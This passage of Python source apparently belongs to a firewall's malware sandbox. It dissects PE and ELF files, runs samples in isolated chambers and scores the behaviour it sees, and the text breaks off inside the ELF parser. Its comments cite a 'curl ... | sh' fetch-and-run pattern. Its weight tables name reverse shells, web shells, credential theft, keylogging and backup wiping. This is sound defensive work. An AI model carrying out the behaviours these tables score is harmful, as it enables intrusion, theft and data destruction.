#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
"""
ffn_crucible.py -- FFN NGFW CRUCIBLE: the unknown-object detonation engine.

A crucible is a sealed vessel you fire an unknown object in to find out what it
actually is. This is that vessel. It takes the objects the inline engine carves
out of live flows, subjects them to the highest-fidelity analysis the box can
actually perform, and turns observed BEHAVIOUR into enforceable content.

    inline_payload_det.carve_files()   unknown PE / ELF / doc / script / PDF
                 |
                 v
      CrucibleSandbox.analyze()        pick the best available chamber
                 |
     +-----------+------------+-----------------+
     |           |            |                 |
  StaticChamber  JailChamber  QemuChamber   (fidelity 0 / 1 / 2)
  dissect only   real exec    full guest VM
  (no exec)      in a jail    snapshot+restore
     |           |            |
     +-----------+------------+
                 |
                 v
           BehaviorTrace              typed observations, not strings:
                 |                    process/file/net/registry/persist/evade
                 v
              Assay                   weighted behaviour rules -> verdict,
                 |                    + IOCs from OBSERVED traffic,
                 |                    + signatures from OBSERVED artefacts
                 v
            SandboxReport             consumed by cloud_det, which writes it
                                      to ThreatDB and pushes it inline/FPGA

WHY DYNAMIC EVIDENCE IS WORTH THE COMPLEXITY
    A static string table can only assert "this file contains the bytes
    CreateRemoteThread". That is a weak claim: the string is present in benign
    binaries and absent from packed malicious ones. A trace asserts "this
    process allocated RWX memory in another process and then connected to
    45.x.x.x:443" -- which is both far harder to fake and directly convertible
    into a low-false-positive signature, because the artefacts a sample creates
    at runtime (its mutex name, its dropped filename, its URI path, its UA
    string) are distinctive to the family and are what the NEXT variant will
    reuse even after its hash changes.

CHAMBER TIERS -- the engine uses the best one that can run the sample, and says
which one it used in every report. A chamber that cannot run declares itself
unavailable with a reason rather than silently producing a weaker verdict.

    fidelity 0  StaticChamber   Always available. Real format dissection: PE
                                section/import table, ELF dynamic symbols,
                                OOXML/OLE macro presence, PDF action objects,
                                script deobfuscation (one base64 layer).
    fidelity 1  JailChamber     Linux, native-arch samples only. Executes the
                                sample under unshare(1) in mount+pid+net
                                namespaces with rlimits and a wall-clock cap,
                                traced with strace(1), and diffs the scratch
                                filesystem for dropped files. Network is
                                namespace-isolated: connect() targets are still
                                recovered from the trace even though they fail.
    fidelity 2  QemuChamber     Foreign OS/arch (PE, Office macros, VBS on a
                                Windows guest). Restores a base qcow2 snapshot,
                                injects the sample, runs a guest agent, and
                                reads observations back over virtio-serial.
                                Networking is SLIRP with restrict=on and a
                                guestfwd to our own Sinkhole, so DNS names,
                                HTTP requests and TLS SNI are captured with NO
                                root and NO route to the real network.

SAFETY
    Nothing here ever executes a sample as a side effect of analysing it. Only
    JailChamber and QemuChamber execute, both are opt-in per chamber policy,
    and the default engine policy on an appliance is static-only until an
    operator enables a live chamber. `--selftest` never executes a sample.

CLI
    ffn_crucible.py selftest                     hermetic; no exec, no network
    ffn_crucible.py chambers                     what this box can actually run
    ffn_crucible.py dissect <file>               fidelity-0 report only
    ffn_crucible.py detonate <file> [--chamber X] [--timeout S]
    ffn_crucible.py assay <file> [--json]        full pipeline -> verdict
    ffn_crucible.py sinkhole [--port-base N]     run the capture sinkhole alone
"""

import argparse
import binascii
import base64
import hashlib
import json
import logging
import math
import os
import re
import shutil
import socket
import struct
import subprocess
import sys
import tempfile
import threading
import time
import zlib
from dataclasses import dataclass, field, asdict
from typing import Dict, List, Optional, Sequence, Tuple

logger = logging.getLogger("ffn-crucible")

# Reuse the tree's shared primitives where they exist. inline_payload_det owns
# ContentSignature (the inline rule type) and the file-magic table; importing it
# here is safe -- it does NOT import this module, so there is no cycle. cloud_det
# DOES import this module, so its SandboxReport is imported lazily in to_report().
try:
    from inline_payload_det import (
        ContentSignature, detect_file_type, shannon_entropy, extract_iocs,
    )
    _HAVE_INLINE = True
except Exception:                                    # standalone / partial deploy
    ContentSignature = None
    _HAVE_INLINE = False

# Verdict signing (see VerdictSigner). Soft: an appliance that only dissects
# locally never signs anything, and must still import this module.
try:
    import ffn_ed25519
except ImportError:
    ffn_ed25519 = None

try:
    from ffn_threatdb import ACTION_ALERT, ACTION_DROP, ACTION_RESET, VERDICT_ACTION
except Exception:
    ACTION_ALERT, ACTION_DROP, ACTION_RESET = 0, 1, 2
    VERDICT_ACTION = {"malware": ACTION_RESET, "phishing": ACTION_RESET,
                      "grayware": ACTION_ALERT, "benign": ACTION_ALERT,
                      "unknown": ACTION_ALERT}

# Largest object we will read into memory for analysis.
MAX_SAMPLE = 64 * 1024 * 1024
# Default wall-clock budget for a live detonation, seconds.
DEFAULT_TIMEOUT = 30
# Cap on observations kept per trace, so a loop cannot exhaust memory.
MAX_OBSERVATIONS = 4096


# ===========================================================================
# Fallback primitives -- only used when inline_payload_det is not deployed.
# Kept byte-for-byte behaviour-compatible with the originals so a report from a
# partial deployment is comparable with one from a full appliance.
# ===========================================================================
if not _HAVE_INLINE:
    _FILE_MAGIC = [
        (b"MZ", "pe"), (b"\x7fELF", "elf"), (b"%PDF", "pdf"), (b"PK\x03\x04", "zip"),
        (b"\xd0\xcf\x11\xe0", "ole"), (b"\xca\xfe\xba\xbe", "macho"),
        (b"\xcf\xfa\xed\xfe", "macho"), (b"#!", "script"), (b"<?php", "php"),
    ]

    def detect_file_type(data: bytes) -> Optional[str]:      # noqa: F811
        head = data[:16]
        for magic, ftype in _FILE_MAGIC:
            if head.startswith(magic):
                return ftype
        if b"<script" in data[:512].lower():
            return "html_js"
        return None

    def shannon_entropy(data: bytes) -> float:               # noqa: F811
        if not data:
            return 0.0
        freq = [0] * 256
        for b in data:
            freq[b] += 1
        n = len(data)
        ent = 0.0
        for c in freq:
            if c:
                p = c / n
                ent -= p * math.log2(p)
        return ent

    # The inline rule type. Mirrors inline_payload_det.ContentSignature field
    # for field -- including region_window, which the rule compiler calls -- so
    # a signature generated without the inline engine present is
    # INDISTINGUISHABLE from one generated with it. Anything less and the same
    # sample would yield subtly different rules depending on what happened to
    # be deployed alongside.
    @dataclass
    class ContentSignature:                              # noqa: F811
        """One inline detection rule (Suricata content/pcre semantics)."""
        sid: int
        name: str
        pattern: bytes = b""
        is_pcre: bool = False
        nocase: bool = False
        offset: int = 0
        depth: int = 0                 # 0 = to end of payload
        proto: str = "any"            # tcp / udp / http / any
        app: str = "any"
        action: int = ACTION_ALERT
        severity: str = "medium"
        threat_name: str = ""
        verdict: str = "malware"      # verdict class this rule asserts
        source: str = "builtin"
        enabled: bool = True

        def region_window(self, n: int) -> Tuple[int, int]:
            start = self.offset if self.offset > 0 else 0
            end = (self.offset + self.depth) if self.depth > 0 else n
            return max(0, start), min(n, end)


    _URL_RE = re.compile(rb"\b(?:https?|ftp)://[^\s\"'<>\)]{4,2048}", re.I)
    _DOMAIN_RE = re.compile(
        rb"\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,24}\b", re.I)
    _IPV4_RE = re.compile(
        rb"\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)\b")

    def extract_iocs(data: bytes, limit: int = 64) -> Dict[str, List[str]]:  # noqa: F811
        out: Dict[str, List[str]] = {"domain": [], "url": [], "ip": []}
        seen = set()
        for rx, key in ((_URL_RE, "url"), (_DOMAIN_RE, "domain"), (_IPV4_RE, "ip")):
            for m in rx.finditer(data):
                v = m.group(0).decode("ascii", "ignore").rstrip(".")
                if not v or v.lower() in seen:
                    continue
                seen.add(v.lower())
                out[key].append(v)
                if len(out[key]) >= limit:
                    break
        return out


# ===========================================================================
# Observation model
#
# An observation is one typed fact about the sample. Static dissection and live
# detonation both emit observations, so the assay does not care where evidence
# came from -- it only cares how strong it is. `live=True` marks evidence that
# came from actually running the sample, which the assay weights higher: a
# string saying "connect" is a hint, a connect() that happened is proof.
# ===========================================================================
OBS_KINDS = (
    "meta",         # file format facts (type, size, arch, entropy)
    "capability",   # an imported/observed capability (API, syscall, verb)
    "process",      # process created / injected / terminated
    "file",         # file written / dropped / deleted
    "registry",     # Windows registry write (guest chambers only)
    "net",          # DNS query / connect / HTTP request / TLS SNI
    "persist",      # persistence installed (run key, service, cron, task)
    "evade",        # anti-analysis (sleep, VM check, debugger check)
    "crypto",       # ransomware-shaped mass rewrite / key material
    "error",        # analysis problem, not sample behaviour
)


# Where a fact came from, which is what decides how much it is worth.
#
#   runtime  the sample did this. Proof.
#   content  the object's own content asserts it -- a shell script that says
#            `curl ... | sh`, a macro that says Shell(), a DDEAUTO field, a
#            format fact like a UPX section. Strong: the code IS the behaviour.
#   import   an import table or dynamic-symbol entry. Weak: it says what the
#            code COULD do, and half of Windows imports VirtualAllocEx.
#
# Collapsing content and import into one "static" bucket was wrong: it let a
# benign binary's imports carry the same weight as a dropper's own source.
SRC_RUNTIME = "runtime"
SRC_CONTENT = "content"
SRC_IMPORT = "import"
STRONG_SOURCES = (SRC_RUNTIME, SRC_CONTENT)


@dataclass
class Observation:
    """One typed fact about a sample."""
    kind: str                       # one of OBS_KINDS
    what: str                       # short stable token, e.g. "connect", "macro"
    detail: str = ""                # human-readable specifics
    live: bool = False              # observed by executing the sample
    value: str = ""                 # the artefact itself (ip:port, path, mutex...)
    source: str = SRC_CONTENT       # one of SRC_*

    @property
    def strong(self) -> bool:
        return self.source in STRONG_SOURCES

    def key(self) -> Tuple[str, str, str]:
        return (self.kind, self.what, self.value)


@dataclass
class BehaviorTrace:
    """Everything one chamber learned about one sample."""
    sha256: str
    file_type: Optional[str] = None
    size: int = 0
    chamber: str = "none"
    fidelity: int = 0
    executed: bool = False
    duration: float = 0.0
    observations: List[Observation] = field(default_factory=list)
    strings: List[str] = field(default_factory=list)      # notable decoded strings
    dropped: List[Dict] = field(default_factory=list)      # {name,size,sha256,type}
    errors: List[str] = field(default_factory=list)

    def add(self, kind: str, what: str, detail: str = "", *,
            live: bool = False, value: str = "",
            source: Optional[str] = None) -> None:
        if len(self.observations) >= MAX_OBSERVATIONS:
            return
        if source is None:
            source = SRC_RUNTIME if live else SRC_CONTENT
        obs = Observation(kind=kind, what=what, detail=detail, live=live,
                          value=value, source=source)
        # de-duplicate on (kind, what, value): a loop that connects 10000 times is
        # one fact, not ten thousand.
        for existing in self.observations:
            if existing.key() == obs.key():
                return
        self.observations.append(obs)

    def of_kind(self, kind: str) -> List[Observation]:
        return [o for o in self.observations if o.kind == kind]

    def has(self, kind: str, what: str) -> bool:
        return any(o.kind == kind and o.what == what for o in self.observations)

    def values(self, kind: str, what: Optional[str] = None) -> List[str]:
        return [o.value for o in self.observations
                if o.kind == kind and (what is None or o.what == what) and o.value]

    def merge(self, other: "BehaviorTrace") -> "BehaviorTrace":
        """Fold another trace in. Higher fidelity wins the chamber attribution."""
        for o in other.observations:
            if len(self.observations) >= MAX_OBSERVATIONS:
                break
            if not any(e.key() == o.key() for e in self.observations):
                self.observations.append(o)
        self.dropped.extend(d for d in other.dropped if d not in self.dropped)
        self.strings.extend(s for s in other.strings if s not in self.strings)
        self.errors.extend(other.errors)
        if other.fidelity > self.fidelity:
            self.chamber, self.fidelity = other.chamber, other.fidelity
        self.executed = self.executed or other.executed
        self.duration += other.duration
        self.file_type = self.file_type or other.file_type
        return self

    def executable_shaped(self) -> bool:
        """Is this the kind of object whose silence should not clear it?"""
        return (self.file_type in ("pe", "elf", "macho", "ole")
                or self.has("capability", "macro")
                or self.has("capability", "macro_auto"))

    def chamber_failed(self) -> bool:
        """Did the analysis itself go wrong, as opposed to the sample?"""
        return bool(self.errors) or bool(self.of_kind("error"))

    # Kinds that constitute BEHAVIOUR, as opposed to lifecycle bookkeeping.
    # `process:exited` is not in here on purpose: every process exits.
    BEHAVIOURAL = ("file", "net", "registry", "persist", "crypto", "capability")
    BEHAVIOURAL_PROCESS = ("exec", "spawn", "kill", "inject")

    def behavioural(self) -> bool:
        """Did the sample actually DO anything we observed at run time?"""
        for o in self.observations:
            if not o.live:
                continue
            if o.kind in self.BEHAVIOURAL:
                return True
            if o.kind == "process" and o.what in self.BEHAVIOURAL_PROCESS:
                return True
        return False

    def conclusive(self) -> bool:
        """Could this run have SEEN misbehaviour if there were any?

        The sample has to have been executed, the chamber has to have worked,
        and the run has to have either observed real behaviour or reached a
        normal conclusion. A trace with neither is indistinguishable from a
        sample that refused to run -- or from one that crashed before it
        started, which is how a segfaulting ELF was reported benign.
        """
        if not self.executed or self.chamber_failed():
            return False
        if self.behavioural():
            return True                    # it showed us something; that counts
        if self.has("process", "crashed"):
            return False                   # died before it could show us
        if self.has("evade", "hung") or self.has("evade", "guest_hung"):
            return False                   # killed, so the run is incomplete
        # Exited normally having done nothing observable. Weak, but real.
        return self.has("process", "exited") or bool(
            [o for o in self.observations if o.live])

    def inconclusive_reason(self) -> str:
        """Why this run cannot clear an executable. Goes in the report."""
        if self.fidelity == 0:
            return ("static inspection only: not enough to clear an "
                    "executable object")
        if self.chamber_failed():
            return ("the %s chamber did not complete (%s), so its silence is "
                    "not evidence" % (self.chamber,
                                      (self.errors or ["see observations"])[0]))
        if not self.executed:
            return ("the %s chamber never executed the sample, so its silence "
                    "is not evidence" % self.chamber)
        if self.has("process", "crashed"):
            return ("the sample died on a signal in the %s chamber before "
                    "doing anything observable, so it never reached its own "
                    "logic" % self.chamber)
        if self.has("evade", "hung") or self.has("evade", "guest_hung"):
            return ("the %s chamber had to kill the sample, so the run is "
                    "incomplete and its silence proves nothing" % self.chamber)
        return ("the %s chamber executed the sample but observed nothing at "
                "run time, which is what an evasive sample looks like"
                % self.chamber)

    def summary(self) -> str:
        by = {}
        for o in self.observations:
            by[o.kind] = by.get(o.kind, 0) + 1
        parts = ["%s=%d" % (k, by[k]) for k in OBS_KINDS if k in by]
        return "%s/f%d %s%s" % (self.chamber, self.fidelity,
                                " ".join(parts) or "no observations",
                                " executed" if self.executed else "")


# ===========================================================================
# Capability table
#
# Maps an imported/observed symbol to a capability token. The token -- not the
# symbol -- is what the assay reasons about, so an ELF `ptrace` and a Windows
# `WriteProcessMemory` both raise "proc_inject" and one rule covers both. Weight
# is how strongly the capability alone implies malice (0..100); the assay applies
# it only in combination, so a high weight is not a verdict on its own.
# ===========================================================================
CAPABILITY: Dict[str, Tuple[str, int, str]] = {
    # -- code injection into another process ---------------------------------
    "createremotethread":       ("proc_inject",  60, "remote thread creation"),
    "createremotethreadex":     ("proc_inject",  60, "remote thread creation"),
    "ntcreatethreadex":         ("proc_inject",  65, "undocumented thread creation"),
    "writeprocessmemory":       ("proc_inject",  55, "writes another process's memory"),
    "ntwritevirtualmemory":     ("proc_inject",  60, "writes another process's memory"),
    "virtualallocex":           ("proc_alloc",   45, "allocates in another process"),
    "ntallocatevirtualmemory":  ("proc_alloc",   35, "raw memory allocation"),
    "queueuserapc":             ("proc_inject",  55, "APC injection"),
    "setthreadcontext":         ("proc_inject",  55, "hijacks thread context"),
    "ptrace":                   ("proc_inject",  50, "attaches to another process"),
    "process_vm_writev":        ("proc_inject",  60, "writes another process's memory"),
    # -- persistence ----------------------------------------------------------
    "regsetvalueexa":           ("persist_reg",  25, "registry write"),
    "regsetvalueexw":           ("persist_reg",  25, "registry write"),
    "regcreatekeyexa":          ("persist_reg",  20, "registry key creation"),
    "regcreatekeyexw":          ("persist_reg",  20, "registry key creation"),
    "createservicea":           ("persist_svc",  40, "installs a service"),
    "createservicew":           ("persist_svc",  40, "installs a service"),
    "schtasks":                 ("persist_task", 35, "scheduled task"),
    "crontab":                  ("persist_cron", 35, "cron persistence"),
    # -- download / execute ---------------------------------------------------
    "urldownloadtofilea":       ("download",     55, "downloads to disk"),
    "urldownloadtofilew":       ("download",     55, "downloads to disk"),
    "internetopenurla":         ("net_http",     25, "HTTP client"),
    "internetopenurlw":         ("net_http",     25, "HTTP client"),
    "internetreadfile":         ("net_http",     25, "HTTP read"),
    "winhttpsendrequest":       ("net_http",     25, "HTTP client"),
    "httpsendrequesta":         ("net_http",     25, "HTTP client"),
    "wsastartup":               ("net_sock",     10, "socket use"),
    "connect":                  ("net_sock",     15, "outbound socket"),
    "winexec":                  ("exec",         40, "process execution"),
    "shellexecutea":            ("exec",         30, "process execution"),
    "shellexecutew":            ("exec",         30, "process execution"),
    "createprocessa":           ("exec",         20, "process execution"),
    "createprocessw":           ("exec",         20, "process execution"),
    "system":                   ("exec",         30, "shell execution"),
    "execve":                   ("exec",         20, "process execution"),
    "popen":                    ("exec",         30, "shell execution"),
    # -- dynamic resolution / packing ----------------------------------------
    "loadlibrarya":             ("dyn_resolve",  15, "runtime library load"),
    "loadlibraryw":             ("dyn_resolve",  15, "runtime library load"),
    "getprocaddress":           ("dyn_resolve",  20, "runtime symbol resolution"),
    "dlopen":                   ("dyn_resolve",  15, "runtime library load"),
    "dlsym":                    ("dyn_resolve",  20, "runtime symbol resolution"),
    "virtualprotect":           ("rwx",          40, "changes page protection"),
    "mprotect":                 ("rwx",          35, "changes page protection"),
    # -- credential and data theft -------------------------------------------
    "cryptunprotectdata":       ("cred_theft",   60, "reads DPAPI secrets"),
    "getasynckeystate":         ("keylog",       55, "keystroke capture"),
    "setwindowshookexa":        ("keylog",       50, "installs an input hook"),
    "setwindowshookexw":        ("keylog",       50, "installs an input hook"),
    "getclipboarddata":         ("clipboard",    30, "reads the clipboard"),
    "bitblt":                   ("screencap",    30, "screen capture"),
    # -- anti-analysis --------------------------------------------------------
    "isdebuggerpresent":        ("evade_dbg",    35, "debugger check"),
    "checkremotedebuggerpresent": ("evade_dbg",  40, "debugger check"),
    "ntqueryinformationprocess": ("evade_dbg",   30, "debugger check"),
    "outputdebugstringa":       ("evade_dbg",    10, "debugger probe"),
    "getsystemfirmwaretable":   ("evade_vm",     35, "firmware/VM probe"),
    "sleep":                    ("evade_sleep",  10, "delays execution"),
    "sleepex":                  ("evade_sleep",  10, "delays execution"),
    # -- destruction ----------------------------------------------------------
    "cryptencrypt":             ("crypto",       35, "encryption"),
    "cryptgenkey":              ("crypto",       35, "key generation"),
    "shfileoperationa":         ("mass_file",    25, "bulk file operation"),
    "shfileoperationw":         ("mass_file",    25, "bulk file operation"),
    "deletefilea":              ("file_delete",  10, "file deletion"),
    "deletefilew":              ("file_delete",  10, "file deletion"),
    "findfirstfilea":           ("file_enum",    10, "file enumeration"),
    "findfirstfilew":           ("file_enum",    10, "file enumeration"),
}

# Weight per capability token, merged from both indicator sources. The loose
# tally in assay() reads this, so a token that exists in DOC_INDICATORS but not
# in CAPABILITY still carries weight -- the omission of exactly this map is why
# an early build scored a JavaScript-bearing PDF at zero.
TOKEN_WEIGHT: Dict[str, int] = {}
for _tok, _w, _d in CAPABILITY.values():
    TOKEN_WEIGHT[_tok] = max(TOKEN_WEIGHT.get(_tok, 0), _w)
TOKEN_WEIGHT.update({
    "macro":          35,   # a document carrying macros at all
    "macro_auto":     55,   # macros that run without a click
    "dde_exec":       70,
    "pdf_js":         40,
    "pdf_autorun":    50,
    "pdf_embed":      35,
    "webshell":       80,
    "revshell":       75,
    "obfuscation":    30,
    "encoded_command": 75,
    # Anti-analysis. Weighted so that a sample which does nothing BUT evade
    # cannot be silence -- see the Evasive.* rules.
    "evade_vm":       55,
    "evade_dbg":      45,
    "evade_sleep":    30,
    "guest_hung":     40,
    # A crash is not malice, but it IS a reason to distrust the run.
    "crashed":         5,
    "hung":           40,
    "mount":          20,
    "lolbin_download": 70,
    "remote_exec":    75,
    "eicar":         100,
    "exploit_eqn":    80,
    "fileless":       65,
    "persist_reg":    25,
    "persist_cron":   35,
    "persist_task":   35,
    "persist_init":   35,
    "persist_unit":   35,
    "persist_ssh":    45,
    "persist_preload": 55,
    "persist_profile": 30,
    "persist_desktop": 30,
    "persist_startup": 45,
    "persist_ifeo":   55,
    "hosts_file":     45,
    "wipe_shadow":    80,
    "wipe_recovery":  70,
    "wipe_backup":    75,
    "ransom_extension": 85,
    "ransom_note":    70,
    "account_change": 60,
    "priv_escalation": 65,
    "remote_template": 60,
})

# PE machine / subsystem decoding, enough to say what the sample targets.
PE_MACHINE = {0x014c: "i386", 0x8664: "amd64", 0x01c0: "arm", 0x01c4: "armnt",
              0xaa64: "arm64", 0x0200: "ia64", 0x01f0: "powerpc", 0x0166: "mips"}
PE_SUBSYSTEM = {1: "native", 2: "gui", 3: "console", 9: "wince", 10: "efi",
                11: "efi_boot", 12: "efi_runtime", 13: "efi_rom", 14: "xbox"}
ELF_MACHINE = {3: "i386", 62: "amd64", 40: "arm", 183: "aarch64", 8: "mips",
               10: "mips", 21: "ppc64", 243: "riscv"}
ELF_TYPE = {1: "rel", 2: "exec", 3: "dyn", 4: "core"}

# Section names that only ever come from a runtime packer.
PACKER_SECTIONS = {
    b"upx0": "UPX", b"upx1": "UPX", b"upx2": "UPX", b".aspack": "ASPack",
    b".adata": "ASPack", b"petite": "Petite", b".themida": "Themida",
    b".vmp0": "VMProtect", b".vmp1": "VMProtect", b".enigma1": "Enigma",
    b".mpress1": "MPRESS", b".mpress2": "MPRESS", b"pec1": "PECompact",
    b".nsp0": "NsPack", b".packed": "generic",
}


# ===========================================================================
# Static dissectors (fidelity 0)
#
# Every dissector is total: it never raises on malformed input, because a
# deliberately corrupt header is itself evidence. A parse that fails part way
# records what it got, adds a malformed/truncated observation, and returns.
# ===========================================================================
def _u8(b, o):   return b[o] if o < len(b) else 0
def _u16(b, o):  return struct.unpack_from("<H", b, o)[0] if o + 2 <= len(b) else 0
def _u32(b, o):  return struct.unpack_from("<I", b, o)[0] if o + 4 <= len(b) else 0
def _u64(b, o):  return struct.unpack_from("<Q", b, o)[0] if o + 8 <= len(b) else 0


def _cstr(b: bytes, o: int, limit: int = 256) -> str:
    if o is None or o < 0 or o >= len(b):
        return ""
    end = b.find(b"\x00", o, o + limit)
    if end < 0:
        end = min(len(b), o + limit)
    return b[o:end].decode("ascii", "replace")


def _note_capability(tr: BehaviorTrace, symbol: str, *, live: bool = False,
                     origin: str = "import") -> Optional[str]:
    """Map one symbol onto a capability observation. Returns the token."""
    ent = CAPABILITY.get(symbol.lower().lstrip("_"))
    if not ent:
        return None
    token, _weight, desc = ent
    tr.add("capability", token, "%s: %s (%s)" % (origin, symbol, desc),
           live=live, value=symbol,
           source=SRC_RUNTIME if live else SRC_IMPORT)
    return token


def dissect_pe(data: bytes, tr: BehaviorTrace) -> None:
    """Parse a PE: COFF/optional headers, section table, import directory."""
    e_lfanew = _u32(data, 0x3C)
    if not (0 < e_lfanew < len(data) - 24) or data[e_lfanew:e_lfanew + 4] != b"PE\x00\x00":
        tr.add("meta", "pe_malformed", "no PE header at e_lfanew=0x%x" % e_lfanew)
        return
    coff = e_lfanew + 4
    machine = _u16(data, coff)
    nsec = _u16(data, coff + 2)
    tstamp = _u32(data, coff + 4)
    opt_size = _u16(data, coff + 16)
    characteristics = _u16(data, coff + 18)
    opt = coff + 20
    magic = _u16(data, opt)
    pe32plus = (magic == 0x20B)

    arch = PE_MACHINE.get(machine, "0x%04x" % machine)
    tr.add("meta", "pe", "machine=%s sections=%d%s" %
           (arch, nsec, " dll" if characteristics & 0x2000 else ""), value=arch)
    if characteristics & 0x2000:
        tr.add("meta", "pe_dll", "library, not a standalone executable")
    if magic not in (0x10B, 0x20B):
        tr.add("meta", "pe_malformed", "bad optional header magic 0x%04x" % magic)

    subsystem = _u16(data, opt + 68)
    dllchar = _u16(data, opt + 70)
    entry = _u32(data, opt + 16)
    sub = PE_SUBSYSTEM.get(subsystem, str(subsystem))
    tr.add("meta", "pe_subsystem", sub, value=sub)
    # Missing exploit mitigations is a mild signal: real toolchains have
    # defaulted them on for a decade, so absence suggests a hand-rolled or
    # repacked binary rather than a compiler default.
    if not dllchar & 0x0040:
        tr.add("meta", "no_aslr", "DYNAMIC_BASE clear")
    if not dllchar & 0x0100:
        tr.add("meta", "no_dep", "NX_COMPAT clear")
    if tstamp == 0:
        tr.add("meta", "pe_no_timestamp", "TimeDateStamp zeroed")
    elif tstamp > time.time() + 86400:
        tr.add("meta", "pe_future_timestamp", "TimeDateStamp %d is in the future"
               % tstamp)

    # -- section table -----------------------------------------------------
    dd_off = opt + (112 if pe32plus else 96)
    sec_off = opt + opt_size
    sections: List[Tuple[str, int, int, int, int, int]] = []
    entry_section = None
    for i in range(min(nsec, 96)):
        so = sec_off + i * 40
        if so + 40 > len(data):
            tr.add("meta", "pe_truncated", "section table runs past end of file")
            break
        raw_name = data[so:so + 8]
        name = raw_name.rstrip(b"\x00").decode("ascii", "replace")
        vsize, vaddr = _u32(data, so + 8), _u32(data, so + 12)
        rsize, raddr = _u32(data, so + 16), _u32(data, so + 20)
        flags = _u32(data, so + 36)
        sections.append((name, vaddr, vsize, raddr, rsize, flags))
        low = raw_name.rstrip(b"\x00").lower()
        if low in PACKER_SECTIONS:
            tr.add("meta", "packer", "%s section %r" % (PACKER_SECTIONS[low], name),
                   value=PACKER_SECTIONS[low])
        if flags & 0x20000000 and flags & 0x80000000:
            tr.add("capability", "rwx",
                   "section %r is both writable and executable" % name, value=name)
        # A virtual size far above the raw size means the section is filled in
        # at run time -- the shape of an unpacking stub.
        if rsize and vsize > rsize * 8 and vsize > 0x10000:
            tr.add("meta", "unpacks_at_runtime",
                   "section %r vsize=0x%x rawsize=0x%x" % (name, vsize, rsize))
        if rsize and raddr + rsize <= len(data) and flags & 0x20000000:
            ent = shannon_entropy(data[raddr:raddr + min(rsize, 65536)])
            if ent >= 7.2:
                tr.add("meta", "high_entropy_code",
                       "section %r entropy %.2f" % (name, ent), value=name)
        if vaddr <= entry < vaddr + max(vsize, rsize):
            entry_section = name
    if entry_section is not None and entry_section.lower() not in (
            ".text", "code", ".itext", ".textbss"):
        tr.add("meta", "entry_outside_text",
               "entry point 0x%x lies in %r" % (entry, entry_section),
               value=entry_section)

    def rva_to_off(rva: int) -> Optional[int]:
        for (_n, vaddr, vsize, raddr, rsize, _f) in sections:
            if vaddr <= rva < vaddr + max(vsize, rsize):
                off = raddr + (rva - vaddr)
                return off if 0 <= off < len(data) else None
        return None

    # -- import directory --------------------------------------------------
    # Bounded on every axis: a hostile file can claim any descriptor count and
    # any thunk count, so both walks stop on a null entry or a hard cap.
    imp_rva = _u32(data, dd_off + 8)
    imports: Dict[str, List[str]] = {}
    if imp_rva:
        base = rva_to_off(imp_rva)
        if base is None:
            tr.add("meta", "pe_malformed", "import RVA 0x%x maps nowhere" % imp_rva)
        else:
            for i in range(256):
                d = base + i * 20
                if d + 20 > len(data):
                    break
                orig_thunk = _u32(data, d)
                name_rva, first_thunk = _u32(data, d + 12), _u32(data, d + 16)
                if not name_rva and not first_thunk:
                    break
                noff = rva_to_off(name_rva)
                dll = _cstr(data, noff, 64).lower() if noff is not None else "?"
                toff = rva_to_off(orig_thunk or first_thunk)
                funcs: List[str] = []
                if toff is not None:
                    step = 8 if pe32plus else 4
                    ordinal_bit = (1 << 63) if pe32plus else (1 << 31)
                    for j in range(2048):
                        t = toff + j * step
                        v = _u64(data, t) if pe32plus else _u32(data, t)
                        if not v:
                            break
                        if v & ordinal_bit:
                            funcs.append("#%d" % (v & 0xFFFF))
                            continue
                        hn = rva_to_off(v & 0x7FFFFFFF)
                        if hn is None:
                            break
                        fn = _cstr(data, hn + 2, 128)
                        if fn:
                            funcs.append(fn)
                            _note_capability(tr, fn, origin=dll)
                if funcs or dll != "?":
                    imports.setdefault(dll, []).extend(funcs)
    total = sum(len(v) for v in imports.values())
    tr.add("meta", "pe_imports", "%d function(s) from %d module(s)"
           % (total, len(imports)), value=str(total))
    # An executable that imports nothing statically resolves its real imports at
    # run time. That is the defining shape of a packer or a shellcode loader.
    if total == 0 and not characteristics & 0x2000:
        tr.add("meta", "no_imports", "executable imports nothing statically")
    elif total <= 3 and any("getprocaddress" in f.lower() or "loadlibrary" in f.lower()
                            for v in imports.values() for f in v):
        tr.add("meta", "resolve_only_imports",
               "imports little beyond the dynamic-resolution pair")

    # Overlay: bytes past the last section, where droppers carry later stages.
    end_of_sections = max((raddr + rsize for (_n, _v, _vs, raddr, rsize, _f)
                           in sections if rsize), default=0)
    if end_of_sections and len(data) > end_of_sections + 1024:
        overlay = len(data) - end_of_sections
        ent = shannon_entropy(data[end_of_sections:end_of_sections + 65536])
        tr.add("meta", "overlay", "%d bytes appended past the last section "
               "(entropy %.2f)" % (overlay, ent), value=str(overlay))
        emb = detect_file_type(data[end_of_sections:end_of_sections + 16])
        if emb:
            tr.add("meta", "embedded_executable",
                   "overlay begins with a %s object" % emb, value=emb)


def dissect_elf(data: bytes, tr: BehaviorTrace) -> None:
    """Parse an ELF: identity, program headers, sections, dynamic strings.

    Handles both endiannesses on purpose -- FFN's own data plane is big-endian
    MIPS64, so a sample carved on that box can be a BE ELF, and an analyser that
    silently mis-parses it would report every field as garbage.
    """
    if len(data) < 64:
        tr.add("meta", "elf_malformed", "shorter than an ELF header")
        return
    ei_class, ei_data = _u8(data, 4), _u8(data, 5)
    if ei_class not in (1, 2) or ei_data not in (1, 2):
        tr.add("meta", "elf_malformed", "bad EI_CLASS/EI_DATA")
        return
    is64 = (ei_class == 2)
    big = (ei_data == 2)
    end = ">" if big else "<"

    def u(o, size):
        if o < 0 or o + size > len(data):
            return 0
        return struct.unpack_from(end + {2: "H", 4: "I", 8: "Q"}[size], data, o)[0]

    e_type, e_machine = u(16, 2), u(18, 2)
    arch = ELF_MACHINE.get(e_machine, "0x%x" % e_machine)
    tr.add("meta", "elf", "%s %s-endian %s %s" %
           ("64-bit" if is64 else "32-bit", "big" if big else "little",
            arch, ELF_TYPE.get(e_type, str(e_type))), value=arch)

    e_phoff = u(32, 8) if is64 else u(28, 4)
    e_phnum = u(56, 2) if is64 else u(44, 2)
    e_shoff = u(40, 8) if is64 else u(32, 4)
    e_shnum = u(60, 2) if is64 else u(48, 2)
    e_shstrndx = u(62, 2) if is64 else u(50, 2)
    ph_size, sh_size = (56, 64) if is64 else (32, 40)

